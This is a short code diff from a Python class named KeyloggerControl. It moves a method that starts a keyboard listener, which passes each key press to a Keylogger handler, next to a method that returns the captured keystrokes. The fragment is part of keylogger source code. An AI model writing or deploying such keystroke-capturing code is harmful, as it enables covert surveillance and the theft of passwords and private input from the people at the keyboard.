@@ -23,17 +23,19 @@ class KeyloggerControl:
         return
 
     @staticmethod
+    def Listen():
+        with Listener(on_press = KeyloggerControl.Keylogger) as listener:
+            listener.join()  
+        return
+        
+    @staticmethod
     def Print():
         return {
             "isSuccess": True,
             "message": container
         }
 
-    @staticmethod
-    def Listen():
-        with Listener(on_press = KeyloggerControl.Keylogger) as listener:
-            listener.join()  
-        return
+    
     
     
     @staticmethod
